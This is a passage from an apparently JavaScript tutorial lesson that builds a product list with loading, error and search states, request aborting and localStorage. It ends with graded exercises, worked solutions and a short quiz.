  <script>
    const API = "https://shop.example/api/products";
    const state = { status: "loading", products: [], query: "", category: "", error: "" };
    const $ = (sel) => document.querySelector(sel);
    const pounds = (pence) => `£${(pence / 100).toFixed(2)}`;

    function visibleProducts() {
      const q = state.query.trim().toLowerCase();
      return state.products.filter((p) => p.name.toLowerCase().includes(q));
    }

    function render() {
      const shown = visibleProducts();
      $("#retry").hidden = state.status !== "error";
      $("#status").className = state.status === "error" ? "error" : "";
      $("#status").textContent =
        state.status === "loading" ? "Loading…" :
        state.status === "error" ? `Couldn't load products: ${state.error}` :
        shown.length === 0 ? "No matches" :
        `${shown.length} product${shown.length === 1 ? "" : "s"}`;
      $("#list").replaceChildren(...(state.status === "ready" ? shown : []).map((p) => {
        const li = document.createElement("li");
        li.textContent = `${p.name}: ${pounds(p.price)}${p.stock === 0 ? " (sold out)" : ""}`;
        li.classList.toggle("out", p.stock === 0);
        return li;
      }));
    }

    let controller = null;
    async function load() {
      controller?.abort();                         // cancel a request that's still running
      controller = new AbortController();
      const { signal } = controller;
      state.status = "loading";
      render();
      try {
        const url = new URL(API);
        if (state.category) url.searchParams.set("category", state.category);
        const res = await fetch(url, { signal });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        state.products = await res.json();
        state.status = "ready";
      } catch (err) {
        if (err.name === "AbortError") return;     // replaced by a newer request: not an error
        state.status = "error";
        state.error = err.message;
      }
      render();
      console.log(`loaded ${state.category || "all"}: ${state.products.length} products`);
    }

    let timer;
    $("#q").addEventListener("input", (e) => {
      clearTimeout(timer);
      timer = setTimeout(() => {                   // debounce: wait for a pause in typing
        state.query = e.target.value;
        render();
      }, 150);
    });
    $("#category").addEventListener("change", (e) => {
      state.category = e.target.value;
      load();
    });
    $("#retry").addEventListener("click", load);

    load();
  </script>
</body>
</html>
```

### Loading, empty and error states

A real request can be slow, can find nothing, or can fail. Users should always see which: an empty list with no explanation looks broken.

- **Loading:** set `state.status = "loading"` and render **before** awaiting, so "Loading…" appears at once.
- **Empty:** "No matches" is different from "nothing loaded yet".
- **Error:** say what went wrong and offer a way out: the **Try again** button just calls `load()` again.

`role="status"` on the message makes screen readers announce each change ("6 products", "No matches") without moving the user's focus; it's an ARIA **live region**.

### Searching as you type

The search filters products already loaded, in memory: no request per keystroke. Filtering is fast here, but the listener still **debounces** (Lesson 21): it waits until the user pauses for 150 ms before re-rendering. When each keystroke triggers something expensive, like a request, debouncing is essential.

Note that `render()` uses `textContent` for product names: they come from an API, so they're outside data (Lesson 27).

### Stale responses

Choose "Tools" and then quickly "Parts": two requests are now running, and nothing guarantees they finish in order. If the "Tools" response arrived last, the page would show tools under the "Parts" filter. `load()` prevents it by **aborting** the previous request (Lesson 25) before starting a new one; the aborted `fetch` rejects with an `AbortError`, which `load()` ignores because a newer request is on its way.

### Remembering preferences

`localStorage` keeps small strings in the browser across visits, per site:

```js-static
try {
  localStorage.setItem("category", state.category);            // strings only: JSON.stringify objects
  state.category = localStorage.getItem("category") ?? "";     // null when it was never saved
} catch {
  // storage can be disabled or full (private windows, sandboxed frames): the app must still work
}
```

It's synchronous, limited to about 5 MB, and readable by any script on the page, so never store passwords or tokens in it. The preview runs in a sandboxed frame without storage, so trying it there throws, which is exactly why the `try` is there.

### Where this leads

Frameworks such as **React**, **Vue**, **Svelte** and **Angular** are built on the same idea you just used: state goes in, a render function describes the page, and the framework updates the DOM efficiently when the state changes. They add components (reusable pieces with their own state), efficient updates, and routing. Learning the DOM first means you'll understand what they do for you, and you can still build small pages, like this one, without them. TypeScript (Part 6) and tooling such as Vite (Part 7) are what those projects are written and built with.

:::exercise Load with loading and error states
Write `async function loadProducts()` that:

1. sets `#status` to `Loading…` and hides `#retry` (its `hidden` property);
2. fetches `https://shop.example/api/products`;
3. on success, fills `<ul id="list">` with one `<li>` per product with the text `Name: £6.00` (replacing anything already there), and sets `#status` to `6 products` (the number loaded);
4. if the request fails or the status isn't OK, empties the list, sets `#status` to `Couldn't load products` and shows `#retry`.

Clicking `#retry` calls `loadProducts()` again. Call it once when the page loads.
```html starter
<!doctype html>
<html lang="en">
<body>
  <p id="status" role="status"></p>
  <button id="retry" hidden>Try again</button>
  <ul id="list"></ul>

  <script>
    async function loadProducts() {
      // your code here
    }

    // your code here
  </script>
</body>
</html>
```
```js check
const load = need("loadProducts", "function");
await waitFor(() => $$("#list li").length === 6, "the list to show the 6 products after the page loads");
same($$("#list li").map((li) => text(li)), ["Inner tube: £6.00", "Bell: £8.00", "Tubeless tyre: £45.00", "Floor pump: £32.00", "Bike lock: £29.00", "Puncture kit: £4.50"], "The list");
same(text("#status"), "6 products", "#status after loading");
same(pick("#retry").hidden, true, "#retry.hidden after a successful load");
const realFetch = window.fetch;
let release;
window.fetch = () => new Promise((resolve) => { release = () => resolve(new Response("[]", { status: 500 })); });
const pending = load();
await settle(10);
same(text("#status"), "Loading…", "#status while the request is in flight");
release();
await pending;
same(text("#status"), "Couldn't load products", "#status after the server answered 500");
same(pick("#retry").hidden, false, "#retry.hidden after an error");
same($$("#list li").length, 0, "The number of items in #list after an error");
window.fetch = () => Promise.reject(new TypeError("Failed to fetch"));
await load();
same(text("#status"), "Couldn't load products", "#status after a network failure");
window.fetch = realFetch;
await click("#retry");
await waitFor(() => text("#status") === "6 products", "the retry button to load the products again");
same(pick("#retry").hidden, true, "#retry.hidden after retrying successfully");
same($$("#list li").length, 6, "The number of items after retrying (replace, don't add)");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <p id="status" role="status"></p>
  <button id="retry" hidden>Try again</button>
  <ul id="list"></ul>

  <script>
    const status = document.querySelector("#status");
    const retry = document.querySelector("#retry");
    const list = document.querySelector("#list");

    async function loadProducts() {
      status.textContent = "Loading…";
      retry.hidden = true;
      try {
        const res = await fetch("https://shop.example/api/products");
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const products = await res.json();
        list.replaceChildren(...products.map((p) => {
          const li = document.createElement("li");
          li.textContent = `${p.name}: £${(p.price / 100).toFixed(2)}`;
          return li;
        }));
        status.textContent = `${products.length} products`;
      } catch {
        list.replaceChildren();
        status.textContent = "Couldn't load products";
        retry.hidden = false;
      }
    }

    retry.addEventListener("click", loadProducts);
    loadProducts();
  </script>
</body>
</html>
```
hint: Set the loading text and `retry.hidden = true` **before** the first `await`, so they show while the request is in flight.
hint: Wrap the fetch in `try` / `catch`. Inside `try`, `if (!res.ok) throw new Error(...)` sends HTTP errors to the same `catch` as network failures.
hint: Build the `<li>`s with `textContent` and `replaceChildren(...items)`; in `catch`, `list.replaceChildren()` empties the list. Then `retry.addEventListener("click", loadProducts)` and call `loadProducts()`.
approach:
1. **Understand:** three visible states (loading, loaded, failed) and a way back from failure.
2. **Examples:** server 500 → "Couldn't load products", retry visible, list empty; retry → 6 products.
3. **Brute force:** awaiting first and only then writing anything: the user sees nothing while waiting, and errors leave the old list on screen.
4. **Pattern:** **loading → try fetch and render → catch shows the error state**.
5. **Plan:** loading text, hide retry → fetch → check ok → json → render items and count; catch → empty, message, show retry.
6. **Code and test:** run it; then temporarily change the URL to `/api/nope` to see the error state.
walkthrough:
**Line by line**

- The loading text and hidden retry button are set synchronously, before `await`, so they appear immediately.
- `if (!res.ok) throw` turns a 500 into an exception, because `fetch` only rejects on network failures (Lesson 24).
- `replaceChildren(...items)` replaces the old list, so retrying doesn't duplicate items.
- One `catch` handles both failure kinds: it empties the list, shows the message and reveals the retry button.
- The retry listener is `loadProducts` itself: a retry is just another load.

**Trace:** load → "Loading…" → 200 with 6 products → 6 items, "6 products". With a 500: "Loading…" → throw → empty list, error text, retry shown. Click retry → back to 6.

**Common wrong approach:** only catching network errors with `fetch(...).catch(...)` and never checking `res.ok`: a 500 response gets parsed and rendered as if it were products.
:::

:::exercise Search as you type
The page loads the products once. Make `#q` filter them as the user types: show an `<li>` with the name of each product whose name **contains** the search text, ignoring upper/lower case and spaces around the text, in their original order. Set `#count` to `4 products`, `1 product`, or `No matches`. An empty search shows every product.

You may debounce the input if you like; the checks wait for the page to update.
```html starter
<!doctype html>
<html lang="en">
<body>
  <input id="q" type="search" placeholder="Search" aria-label="Search products">
  <p id="count" role="status">Loading…</p>
  <ul id="list"></ul>

  <script>
    let products = [];

    function render() {
      // your code here
    }

    fetch("https://shop.example/api/products")
      .then((res) => res.json())
      .then((data) => {
        products = data;
        render();
      });
  </script>
</body>
</html>
```
```js check
const names = () => $$("#list li").map((li) => text(li));
const all = ["Inner tube", "Bell", "Tubeless tyre", "Floor pump", "Bike lock", "Puncture kit"];
await waitFor(() => names().length === 6, "the list to show all 6 products after loading");
same(names(), all, "The list with an empty search");
same(text("#count"), "6 products", "#count with an empty search");
await type("#q", "b");
await waitFor(() => names().length === 4, 'the list to update after typing "b"');
same(names(), ["Inner tube", "Bell", "Tubeless tyre", "Bike lock"], 'The list for "b"');
same(text("#count"), "4 products", '#count for "b"');
await type("#q", "BELL");
await waitFor(() => names().length === 1, 'the list to update after typing "BELL"');
same(names(), ["Bell"], 'The list for "BELL" (ignore case)');
same(text("#count"), "1 product", '#count for one match');
await type("#q", "  pump ");
await waitFor(() => names().join() === "Floor pump", 'the list to show "Floor pump" for "  pump " (trim the search text)');
await type("#q", "zzz");
await waitFor(() => names().length === 0, 'the list to be empty for "zzz"');
same(text("#count"), "No matches", "#count when nothing matches");
await type("#q", "");
await waitFor(() => names().length === 6, "the list to show everything again when the search is cleared");
same(names(), all, "The list after clearing the search");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <input id="q" type="search" placeholder="Search" aria-label="Search products">
  <p id="count" role="status">Loading…</p>
  <ul id="list"></ul>

  <script>
    let products = [];
    const q = document.querySelector("#q");

    function render() {
      const term = q.value.trim().toLowerCase();
      const shown = products.filter((p) => p.name.toLowerCase().includes(term));
      document.querySelector("#list").replaceChildren(...shown.map((p) => {
        const li = document.createElement("li");
        li.textContent = p.name;
        return li;
      }));
      document.querySelector("#count").textContent =
        shown.length === 0 ? "No matches" : `${shown.length} product${shown.length === 1 ? "" : "s"}`;
    }

    q.addEventListener("input", render);

    fetch("https://shop.example/api/products")
      .then((res) => res.json())
      .then((data) => {
        products = data;
        render();
      });
  </script>
</body>
</html>
```
hint: In `render()`, read the search box, then `trim().toLowerCase()` it. Compare with `p.name.toLowerCase().includes(term)`; every name includes `""`, so an empty search keeps everything.
hint: Build `<li>` elements with `textContent` from the filtered array and put them in with `replaceChildren(...)`.
hint: Pick the count text with the length: `0` → "No matches", `1` → "1 product", otherwise "N products". Then `q.addEventListener("input", render)`.
approach:
1. **Understand:** derived view: the visible list and count are computed from `products` and the search text.
2. **Examples:** "b" → 4 (tube, bell, tyre, lock); "BELL" → 1; "zzz" → No matches; "" → all 6.
3. **Brute force:** hiding non-matching `<li>`s with `hidden`: works, but the count and order logic get spread around.
4. **Pattern:** **render from state**: filter the data, then rebuild the list.
5. **Plan:** term = trimmed lower-case input → filter → rebuild list → count text → render on every input.
6. **Code and test:** type in the preview, including capitals and spaces.
walkthrough:
**Line by line**

- `render()` reads the current search text each time, so it works whoever calls it: the input listener or the initial load.
- `trim().toLowerCase()` on the search and `toLowerCase()` on the names make the match ignore case and surrounding spaces.
- `filter` keeps the original order of `products`.
- `replaceChildren` swaps in the new items in one update; `textContent` keeps names safe.
- The count message handles the three cases, including singular "product".
- Typing before the products arrive is fine: `products` is `[]`, then the load calls `render()` with the current search text.

**Trace:** "b" matches "Inner tu**b**e", "**B**ell", "Tu**b**eless tyre", "**B**ike lock" → "4 products".

**Common wrong approach:** filtering `products` in place (`products = products.filter(...)`): each search permanently removes products, so clearing the search can't bring them back. Keep the loaded data unchanged and derive the view from it.
:::

:::quiz
? In the state-and-render approach, what should an event handler do?
+ Update the state, then call render()
- Change the elements it needs directly
- Re-fetch the whole page
= render() is the only code that changes the page, so the page always matches the state.
? The user switches category twice quickly. Why abort the first request?
+ Its response could arrive last and overwrite the newer results
- Browsers can't run two fetches at once
- Aborting makes the second request faster
= Responses can arrive in any order; cancelling stale ones keeps the page consistent.
? What does role="status" on a message element do?
+ Screen readers announce its changes without moving focus
- It styles the element as a status bar
- It makes the element update automatically
= It's an ARIA live region.
? Which is safe to keep in localStorage?
+ The user's preferred category
- A login token
- A password, if it's encoded with btoa
= Any script on the page can read localStorage; keep secrets out of it.
:::
